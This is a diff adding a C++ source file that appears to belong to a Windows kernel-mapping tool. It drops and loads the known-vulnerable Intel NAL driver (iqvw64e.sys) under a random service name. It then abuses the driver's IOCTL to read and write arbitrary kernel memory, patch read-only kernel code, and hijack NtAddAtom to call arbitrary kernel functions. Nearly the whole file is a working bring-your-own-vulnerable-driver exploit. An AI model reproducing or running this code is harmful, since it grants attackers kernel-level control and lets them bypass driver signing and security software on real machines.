@@ -1,0 +1,563 @@
+#include "nal.h"
+
+#include "log.h"
+#include "nt.h"
+#include "service.h"
+
+#include "res/iqvw_sys.h"
+
+#include <cstdlib>
+#include <cstring>
+#include <ctime>
+#include <fstream>
+#include <vector>
+
+namespace
+{
+    constexpr ULONG32 kIoctl = 0x80862007;
+    constexpr DWORD   kServiceTypeKernel = 1;
+
+    /*
+     * NAL request blocks. Every case shares a 64-bit case number at offset 0
+     * followed by a reserved slot; the remaining fields depend on the case.
+     */
+    typedef struct _COPY_MEMORY_BUFFER_INFO
+    {
+        uint64_t case_number;
+        uint64_t reserved;
+        uint64_t source;
+        uint64_t destination;
+        uint64_t length;
+    } COPY_MEMORY_BUFFER_INFO;
+
+    typedef struct _FILL_MEMORY_BUFFER_INFO
+    {
+        uint64_t case_number;
+        uint64_t reserved1;
+        uint32_t value;
+        uint32_t reserved2;
+        uint64_t destination;
+        uint64_t length;
+    } FILL_MEMORY_BUFFER_INFO;
+
+    typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
+    {
+        uint64_t case_number;
+        uint64_t reserved;
+        uint64_t return_physical_address;
+        uint64_t address_to_translate;
+    } GET_PHYS_ADDRESS_BUFFER_INFO;
+
+    typedef struct _MAP_IO_SPACE_BUFFER_INFO
+    {
+        uint64_t case_number;
+        uint64_t reserved;
+        uint64_t return_value;
+        uint64_t return_virtual_address;
+        uint64_t physical_address_to_map;
+        uint32_t size;
+    } MAP_IO_SPACE_BUFFER_INFO;
+
+    typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
+    {
+        uint64_t case_number;
+        uint64_t reserved1;
+        uint64_t reserved2;
+        uint64_t virtual_address;
+        uint32_t size;
+    } UNMAP_IO_SPACE_BUFFER_INFO;
+
+    typedef struct _READ_MEMORY_BUFFER_INFO
+    {
+        uint64_t case_number;
+        uint64_t reserved;
+        uint64_t address;
+        uint64_t buffer;
+        uint64_t size;
+    } READ_MEMORY_BUFFER_INFO;
+
+    typedef struct _WRITE_MEMORY_BUFFER_INFO
+    {
+        uint64_t case_number;
+        uint64_t reserved;
+        uint64_t address;
+        uint64_t buffer;
+        uint64_t size;
+    } WRITE_MEMORY_BUFFER_INFO;
+
+    std::wstring g_serviceName;
+    std::wstring g_driverPath;
+    std::wstring g_statePath;
+
+    std::wstring RandomServiceName()
+    {
+        static const char alphanum[] =
+            "abcdefghijklmnopqrstuvwxyz"
+            "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        char buffer[32] = { 0 };
+
+        srand((unsigned)time(nullptr) * GetCurrentThreadId());
+        const int len = rand() % 12 + 12;
+
+        for (int i = 0; i < len; ++i)
+            buffer[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
+
+        return std::wstring(buffer, buffer + len);
+    }
+
+    bool Ioctl(const void* in, DWORD inSize, void* out, DWORD outSize, DWORD* returned)
+    {
+        if (nal::hDevice == INVALID_HANDLE_VALUE || !nal::hDevice)
+            return false;
+
+        DWORD bytes = 0;
+        const BOOL ok = DeviceIoControl(nal::hDevice, kIoctl,
+                                        const_cast<void*>(in), inSize,
+                                        out, outSize, &bytes, nullptr);
+        if (returned)
+            *returned = bytes;
+        return ok != FALSE;
+    }
+}
+
+namespace nal
+{
+    HANDLE  hDevice = INVALID_HANDLE_VALUE;
+    ULONG64 ntoskrnlBase = 0;
+
+    void SetStatePath(const std::wstring& path)
+    {
+        g_statePath = path;
+    }
+
+    bool SaveState()
+    {
+        if (g_statePath.empty() || g_serviceName.empty())
+            return false;
+
+        std::ofstream out(g_statePath, std::ios::binary | std::ios::trunc);
+        if (!out)
+            return false;
+
+        const std::string service(g_serviceName.begin(), g_serviceName.end());
+        const std::string path(g_driverPath.begin(), g_driverPath.end());
+
+        out << service << "\n" << path << "\n";
+        return out.good();
+    }
+
+    bool LoadState()
+    {
+        if (g_statePath.empty() || !g_serviceName.empty())
+            return false;
+
+        std::ifstream in(g_statePath, std::ios::binary);
+        if (!in)
+            return false;
+
+        std::string service;
+        std::string path;
+        std::getline(in, service);
+        std::getline(in, path);
+
+        if (service.empty())
+            return false;
+
+        g_serviceName.assign(service.begin(), service.end());
+        g_driverPath.assign(path.begin(), path.end());
+        return true;
+    }
+
+    bool IsRunning()
+    {
+        const HANDLE probe = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr,
+                                         OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (probe != INVALID_HANDLE_VALUE)
+        {
+            CloseHandle(probe);
+            return true;
+        }
+        return false;
+    }
+
+    bool Load(const wchar_t* driverPath)
+    {
+        if (IsRunning())
+        {
+            vgb_log::Warn("\\Device\\Nal is already in use");
+            vgb_log::Warn("another NAL user (or a crashed run) holds it — reboot if it persists");
+            return false;
+        }
+
+        g_serviceName = RandomServiceName();
+
+        std::wstring temp = nt::GetFullTempPath();
+        if (temp.empty())
+        {
+            vgb_log::Error("cannot resolve %%TEMP%%");
+            return false;
+        }
+
+        g_driverPath = temp + L"\\" + g_serviceName + L".sys";
+
+        if (!nt::CreateFileFromMemory(g_driverPath,
+                                      reinterpret_cast<const char*>(iqvw64e_sys),
+                                      iqvw64e_sys_size))
+        {
+            vgb_log::Error("cannot write the vulnerable driver to %ls", g_driverPath.c_str());
+            return false;
+        }
+
+        vgb_log::Step("vulnerable driver dropped: %ls", g_driverPath.c_str());
+
+        const NTSTATUS status = service::RegisterAndStart(g_driverPath, g_serviceName);
+        if (!NT_SUCCESS(status))
+        {
+            vgb_log::Error("service load failed (0x%08X)", status);
+            _wremove(g_driverPath.c_str());
+            return false;
+        }
+
+        hDevice = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr,
+                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hDevice == INVALID_HANDLE_VALUE)
+        {
+            vgb_log::Error("\\Device\\Nal did not come up");
+            service::StopAndRemove(g_serviceName);
+            _wremove(g_driverPath.c_str());
+            return false;
+        }
+
+        ntoskrnlBase = nt::GetKernelModuleAddress("ntoskrnl.exe");
+        if (!ntoskrnlBase)
+        {
+            vgb_log::Warn("could not resolve ntoskrnl.exe base");
+        }
+
+        SaveState();
+        return true;
+    }
+
+    bool Unload()
+    {
+        LoadState();
+
+        if (hDevice != INVALID_HANDLE_VALUE && hDevice)
+        {
+            CloseHandle(hDevice);
+            hDevice = INVALID_HANDLE_VALUE;
+        }
+
+        if (!g_serviceName.empty())
+        {
+            service::StopAndRemove(g_serviceName);
+            g_serviceName.clear();
+        }
+
+        if (!g_driverPath.empty())
+        {
+            _wremove(g_driverPath.c_str());
+            g_driverPath.clear();
+        }
+
+        ntoskrnlBase = 0;
+        return true;
+    }
+
+    bool MemCopy(uint64_t destination, uint64_t source, uint64_t size)
+    {
+        if (!destination || !source || !size)
+            return false;
+
+        COPY_MEMORY_BUFFER_INFO request = { 0 };
+        request.case_number = 0x33;
+        request.source = source;
+        request.destination = destination;
+        request.length = size;
+
+        return Ioctl(&request, sizeof(request), nullptr, 0, nullptr);
+    }
+
+    bool SetMemory(uint64_t address, uint32_t value, uint64_t size)
+    {
+        if (!address || !size)
+            return false;
+
+        FILL_MEMORY_BUFFER_INFO request = { 0 };
+        request.case_number = 0x30;
+        request.destination = address;
+        request.value = value;
+        request.length = size;
+
+        return Ioctl(&request, sizeof(request), nullptr, 0, nullptr);
+    }
+
+    bool ReadMemory(uint64_t address, void* buffer, uint64_t size)
+    {
+        if (!address || !buffer || !size)
+            return false;
+
+        READ_MEMORY_BUFFER_INFO request = { 0 };
+        request.case_number = 0x31;
+        request.address = address;
+        request.buffer = reinterpret_cast<uint64_t>(buffer);
+        request.size = size;
+
+        return Ioctl(&request, sizeof(request), nullptr, 0, nullptr);
+    }
+
+    bool WriteMemory(uint64_t address, void* buffer, uint64_t size)
+    {
+        if (!address || !buffer || !size)
+            return false;
+
+        WRITE_MEMORY_BUFFER_INFO request = { 0 };
+        request.case_number = 0x37;
+        request.address = address;
+        request.buffer = reinterpret_cast<uint64_t>(buffer);
+        request.size = size;
+
+        return Ioctl(&request, sizeof(request), nullptr, 0, nullptr);
+    }
+
+    bool GetPhysicalAddress(uint64_t address, uint64_t* outPhysical)
+    {
+        if (!address || !outPhysical)
+            return false;
+
+        GET_PHYS_ADDRESS_BUFFER_INFO request = { 0 };
+        request.case_number = 0x25;
+        request.address_to_translate = address;
+
+        if (!Ioctl(&request, sizeof(request), nullptr, 0, nullptr))
+            return false;
+
+        *outPhysical = request.return_physical_address;
+        return *outPhysical != 0;
+    }
+
+    uint64_t MapIoSpace(uint64_t physicalAddress, uint32_t size)
+    {
+        if (!physicalAddress || !size)
+            return 0;
+
+        MAP_IO_SPACE_BUFFER_INFO request = { 0 };
+        request.case_number = 0x19;
+        request.physical_address_to_map = physicalAddress;
+        request.size = size;
+
+        if (!Ioctl(&request, sizeof(request), nullptr, 0, nullptr))
+            return 0;
+
+        return request.return_virtual_address;
+    }
+
+    bool UnmapIoSpace(uint64_t address, uint32_t size)
+    {
+        if (!address || !size)
+            return false;
+
+        UNMAP_IO_SPACE_BUFFER_INFO request = { 0 };
+        request.case_number = 0x1A;
+        request.virtual_address = address;
+        request.size = size;
+
+        return Ioctl(&request, sizeof(request), nullptr, 0, nullptr);
+    }
+
+    bool WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size)
+    {
+        uint64_t physical = 0;
+
+        if (!address || !buffer || !size)
+            return false;
+
+        if (!GetPhysicalAddress(address, &physical))
+            return false;
+
+        const uint64_t mapped = MapIoSpace(physical, size);
+        if (!mapped)
+            return false;
+
+        const bool ok = MemCopy(mapped, reinterpret_cast<uint64_t>(buffer), size);
+        UnmapIoSpace(mapped, size);
+
+        return ok;
+    }
+
+    uint64_t GetKernelModuleBase(const char* moduleName)
+    {
+        return nt::GetKernelModuleAddress(moduleName);
+    }
+
+    uint64_t GetKernelModuleExport(uint64_t moduleBase, const std::string& functionName)
+    {
+        if (!moduleBase)
+            return 0;
+
+        IMAGE_DOS_HEADER dosHeader = { 0 };
+        IMAGE_NT_HEADERS64 ntHeaders = { 0 };
+
+        if (!ReadMemory(moduleBase, &dosHeader, sizeof(dosHeader)))
+            return 0;
+        if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
+            return 0;
+
+        if (!ReadMemory(moduleBase + dosHeader.e_lfanew, &ntHeaders, sizeof(ntHeaders)))
+            return 0;
+        if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
+            return 0;
+
+        const IMAGE_DATA_DIRECTORY exportDirectory =
+            ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+
+        if (!exportDirectory.VirtualAddress || !exportDirectory.Size)
+            return 0;
+
+        IMAGE_EXPORT_DIRECTORY exports = { 0 };
+        if (!ReadMemory(moduleBase + exportDirectory.VirtualAddress, &exports, sizeof(exports)))
+            return 0;
+
+        if (!exports.NumberOfNames)
+            return 0;
+
+        std::vector<uint32_t> nameTable(exports.NumberOfNames);
+        if (!ReadMemory(moduleBase + exports.AddressOfNames, nameTable.data(),
+                        nameTable.size() * sizeof(uint32_t)))
+            return 0;
+
+        for (uint32_t i = 0; i < exports.NumberOfNames; ++i)
+        {
+            char name[256] = { 0 };
+            if (!ReadMemory(moduleBase + nameTable[i], name, sizeof(name) - 1))
+                continue;
+
+            if (functionName != name)
+                continue;
+
+            uint16_t ordinal = 0;
+            if (!ReadMemory(moduleBase + exports.AddressOfNameOrdinals + i * sizeof(uint16_t),
+                            &ordinal, sizeof(ordinal)))
+                return 0;
+
+            uint32_t functionRva = 0;
+            if (!ReadMemory(moduleBase + exports.AddressOfFunctions + ordinal * sizeof(uint32_t),
+                            &functionRva, sizeof(functionRva)))
+                return 0;
+
+            return moduleBase + functionRva;
+        }
+
+        return 0;
+    }
+
+    uint64_t AllocatePool(uint64_t size)
+    {
+        static uint64_t kernelExAllocatePool = 0;
+
+        if (!size || !ntoskrnlBase)
+            return 0;
+
+        if (!kernelExAllocatePool)
+            kernelExAllocatePool = GetKernelModuleExport(ntoskrnlBase, "ExAllocatePool");
+
+        if (!kernelExAllocatePool)
+            return 0;
+
+        const uint64_t args[4] = { 0, size, 0x42475662, 0 };
+        uint64_t result = 0;
+
+        if (!CallKernelFunctionRaw(&result, kernelExAllocatePool, args, 3))
+            return 0;
+
+        return result;
+    }
+
+    bool FreePool(uint64_t address)
+    {
+        static uint64_t kernelExFreePool = 0;
+
+        if (!address || !ntoskrnlBase)
+            return false;
+
+        if (!kernelExFreePool)
+            kernelExFreePool = GetKernelModuleExport(ntoskrnlBase, "ExFreePool");
+
+        if (!kernelExFreePool)
+            return false;
+
+        const uint64_t args[4] = { address, 0, 0, 0 };
+        return CallKernelFunctionRaw(nullptr, kernelExFreePool, args, 1);
+    }
+
+    bool CallKernelFunctionRaw(void* outResult, uint64_t kernelFunction,
+                               const uint64_t args[4], int argCount)
+    {
+        if (!kernelFunction)
+            return false;
+
+        const HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+        if (!ntdll)
+            return false;
+
+        const auto userNtAddAtom =
+            reinterpret_cast<NTSTATUS(NTAPI*)(PVOID, ULONG, PVOID)>(
+                GetProcAddress(ntdll, "NtAddAtom"));
+
+        if (!userNtAddAtom)
+            return false;
+
+        /* mov rax, imm64 ; jmp rax */
+        uint8_t stub[12] = { 0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, 0xFF, 0xE0 };
+        *reinterpret_cast<uint64_t*>(&stub[2]) = kernelFunction;
+
+        static uint64_t kernelNtAddAtom = 0;
+
+        if (!kernelNtAddAtom)
+        {
+            if (!ntoskrnlBase)
+                return false;
+
+            kernelNtAddAtom = GetKernelModuleExport(ntoskrnlBase, "NtAddAtom");
+            if (!kernelNtAddAtom)
+                return false;
+        }
+
+        uint8_t original[sizeof(stub)] = { 0 };
+        if (!ReadMemory(kernelNtAddAtom, original, sizeof(original)))
+            return false;
+
+        if (!WriteToReadOnlyMemory(kernelNtAddAtom, stub, sizeof(stub)))
+            return false;
+
+        /* Confirm the patch actually landed; a silently failed write would send
+         * the next call into garbage. */
+        uint8_t verify[sizeof(stub)] = { 0 };
+        if (!ReadMemory(kernelNtAddAtom, verify, sizeof(verify)) ||
+            memcmp(verify, stub, sizeof(stub)) != 0)
+        {
+            WriteToReadOnlyMemory(kernelNtAddAtom, original, sizeof(original));
+            vgb_log::Error("NtAddAtom patch did not take effect");
+            return false;
+        }
+
+        /*
+         * The syscall dispatch preserves rcx/rdx/r8/r9, so calling the user-mode
+         * NtAddAtom lands on our patched kernel entry with the arguments intact.
+         */
+        using call4_t = uint64_t(NTAPI*)(uint64_t, uint64_t, uint64_t, uint64_t);
+        const auto call = reinterpret_cast<call4_t>(userNtAddAtom);
+
+        const uint64_t result = call(argCount > 0 ? args[0] : 0,
+                                     argCount > 1 ? args[1] : 0,
+                                     argCount > 2 ? args[2] : 0,
+                                     argCount > 3 ? args[3] : 0);
+
+        WriteToReadOnlyMemory(kernelNtAddAtom, original, sizeof(original));
+
+        if (outResult)
+            *reinterpret_cast<uint64_t*>(outResult) = result;
+
+        return true;
+    }
+}
